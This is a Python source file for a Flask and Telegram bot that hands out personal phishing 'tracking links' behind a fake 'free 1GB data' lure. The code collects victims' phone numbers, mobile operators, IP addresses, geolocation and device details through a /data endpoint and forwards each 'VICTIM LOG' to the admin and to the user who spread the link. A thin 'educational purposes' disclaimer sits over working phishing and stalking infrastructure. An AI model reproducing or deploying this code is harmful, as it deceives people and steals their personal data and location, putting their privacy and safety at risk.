import logging
import asyncio
import os
import re
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler, ExtBot
import aiohttp

# --- কনফিগারেশন ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL")
RENDER_APP_URL = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}"

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"
OWNER_USERNAME = "https://t.me/TheSagorOfficial"

# লগিং সেটআপ
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- টেলিগ্রাম বট এবং অ্যাপ্লিকেশন সেটআপ ---
# Bot এবং Application অবজেক্ট বিশ্বব্যাপী তৈরি করা হচ্ছে
bot = Bot(token=TOKEN)
application = Application.builder().bot(bot).build()

# Flask অ্যাপ ইনিশিয়ালাইজেশন
app = Flask(__name__)

# --- শিকারের ডেটা গ্রহণ করার জন্য ওয়েব রুট ---
@app.route('/data', methods=['POST'])
async def handle_data():
    try:
        data = await request.get_json()
        logger.info(f"Received data packet: {data}")
        
        if request.headers.getlist("X-Forwarded-For"):
            victim_ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            victim_ip = request.remote_addr
        
        logger.info(f"Victim IP identified as: {victim_ip}")

        asyncio.create_task(process_victim_data(data, victim_ip))
        
        return jsonify({"status": "success", "message": "Data received"}), 200
    except Exception as e:
        logger.error(f"Error in handle_data: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

# --- টেলিগ্রাম আপডেটের জন্য Webhook রুট ---
@app.route('/telegram', methods=['POST'])
async def telegram_webhook():
    try:
        update_data = await request.get_json()
        update = Update.de_json(update_data, bot)
        await application.process_update(update)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Error in telegram_webhook: {e}")
        return jsonify({"status": "error"}), 500

# --- Webhook সেট করার জন্য একটি রুট (ঐচ্ছিক কিন্তু সুবিধাজনক) ---
@app.route('/set_webhook', methods=['GET'])
async def set_webhook():
    webhook_url = f"{RENDER_APP_URL}/telegram"
    try:
        await bot.set_webhook(url=webhook_url)
        message = f"Webhook successfully set to: {webhook_url}"
        logger.info(message)
        return jsonify({"status": "success", "message": message}), 200
    except Exception as e:
        error_message = f"Failed to set webhook: {e}"
        logger.error(error_message)
        return jsonify({"status": "error", "message": error_message}), 500

# --- IP বিবরণ পাওয়ার ফাংশন ---
async def get_ip_details(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip}') as response:
                if response.status == 200:
                    return await response.json()
    except Exception as e:
        logger.error(f"Failed to get IP details for {ip}: {e}")
    return {}

# --- শিকারের ডেটা প্রসেস করার ফাংশন ---
async def process_victim_data(data, victim_ip):
    student_id = data.get('student_id', 'unknown')
    form_data = data.get('form_data', {})
    device_info = data.get('device_info', {})
    location_info = data.get('location_info', {})

    ip_details = await get_ip_details(victim_ip)

    location_link = "Not Available"
    if 'lat' in location_info and 'lon' in location_info:
        location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"

    admin_message = f"""
[student_id={student_id}]
💀 ***====[ VICTIM LOG | @TheSagorOfficial ]====*** 💀

--- ***FORM DATA*** ---
📞 ***Number:*** `{form_data.get('country')} {form_data.get('mobileNumber')}`
📡 ***Operator:*** `{form_data.get('operator')}`

--- ***IP & LOCATION*** ---
🌐 ***IP Address:*** `{victim_ip}`
🏢 ***ISP:*** `{ip_details.get('isp', 'N/A')}`
🔍 ***ASN:*** `{ip_details.get('as', 'N/A')}`
🌍 ***Country:*** `{ip_details.get('country', 'N/A')}`
🏙️ ***City:*** `{ip_details.get('city', 'N/A')}`
📍 ***Google Maps:*** [View on Map]({location_link})

--- ***DEVICE INFO*** ---
📱 ***Device Type:*** `{device_info.get('deviceType', 'N/A')}`
🔋 ***Battery:*** `{device_info.get('battery', {}).get('level', 'N/A')}`
🔌 ***Charging:*** `{device_info.get('battery', {}).get('charging', 'N/A')}`
📶 ***Network:*** `{device_info.get('network', 'N/A')}`
🖥️ ***Screen:*** `{device_info.get('screen', 'N/A')}`
⏰ ***TimeZone:*** `{device_info.get('timeZone', 'N/A')}`
🆔 ***Platform:*** `{device_info.get('platform', 'N/A')}`
🕵️ ***User Agent:*** `{device_info.get('userAgent', 'N/A')}`

--- ***STATUS*** ---
🎯 ***Location Status:*** `{location_info.get('error') or f"Success ({location_info.get('accuracy', 'N/A')}m accuracy)"}`
"""
    try:
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode='Markdown')
        logger.info(f"Admin log sent for student {student_id}")
    except Exception as e:
        logger.error(f"Failed to send log to admin: {e}")

# --- টেলিগ্রাম বট হ্যান্ডলার ---
async def start_command(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! 🎉\n\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗛𝗮𝗰𝗸 :\n"
        "🔹 Front Camera\n🔹 Back Camera\n🔹 Location with map\n🔹 Phone number\n🔹 Sim Type\n🔹 IP, Battery, and many more\n🔹 Device type\n\n"
        "𝗡𝗼𝘁𝗲: 𝗜𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗮𝗻𝗱 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀 💡\n\n"
        "Now press create button to generate your link. 😊"
    )
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def create_link_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    if query:
        await query.answer() # Callback query-র উত্তর দেওয়া জরুরি
        user_id = query.from_user.id
    else:
        user_id = update.message.from_user.id

    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    message_text = (
        "🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
        f"🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: `{personal_link}`\n\n"
        "📝𝗡𝗼𝘁𝗲⚠\n\n->This bot 𝗨𝗥𝗟 not work complete on telegram web\n\n->So Use this 𝗨𝗥𝗟 on chrome or others browsers.✅\n\n"
        "Feel The power 💪⚡ of sagor Sheikh 😎"
    )
    share_text = (
        "🌟𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗢𝗳𝗳𝗲𝗿: 𝗖𝗹𝗮𝗶𝗺 𝗬𝗼𝘂𝗿 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕 𝗗𝗮𝘁𝗮!🌟\n\n"
        "Looking for a quick internet boost? 🎁\nEnjoy 1GB of free internet 🌍✨!\n\n"
        "✨ 𝗖𝗹𝗮𝗶𝗺 𝘆𝗼𝘂𝗿 𝗙𝗥𝗘𝗘 𝟭𝗚𝗕 𝗻𝗼𝘄! 🚀\n\n"
        f"👉𝗚𝗲𝘁 Your 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n👉{personal_link}\n\n"
        "Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!"
    )
    telegram_share_url = f"https://t.me/share/url?url={personal_link}&text={share_text.replace(' ', '%20').replace(' ', '%0A')}"
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if query:
        await query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

async def message_filter(update: Update, context: CallbackContext) -> None:
    if str(update.message.chat_id) != str(ADMIN_CHAT_ID): return
    text = update.message.text or update.message.caption
    if not text: return
    match = re.search(r'\[student_id=(\d+)\]', text)
    if not match: return
    student_id = match.group(1)
    clean_message = re.sub(r'\[student_id=\d+\]\s*', '', text).strip()
    try:
        if update.message.photo:
            await context.bot.send_photo(chat_id=student_id, photo=update.message.photo[-1].file_id, caption=clean_message, parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=student_id, text=clean_message, parse_mode='Markdown')
        logger.info(f"Log successfully forwarded to student {student_id}")
    except Exception as e:
        logger.error(f"Failed to forward log to student {student_id}: {e}")
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⚠️ **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')

# --- হ্যান্ডলারগুলো application-এ যোগ করা ---
application.add_handler(CommandHandler("start", start_command))
application.add_handler(CommandHandler("create", create_link_handler))
application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))

# --- Gunicorn এই ফাইলটি চালালে __name__ হবে 'freemb_controller_bot' বা অনুরূপ ---
# __name__ == '__main__' ব্লকটি এখানে আর প্রয়োজন নেই কারণ Gunicorn সরাসরি 'app' অবজেক্টটি ব্যবহার করে।
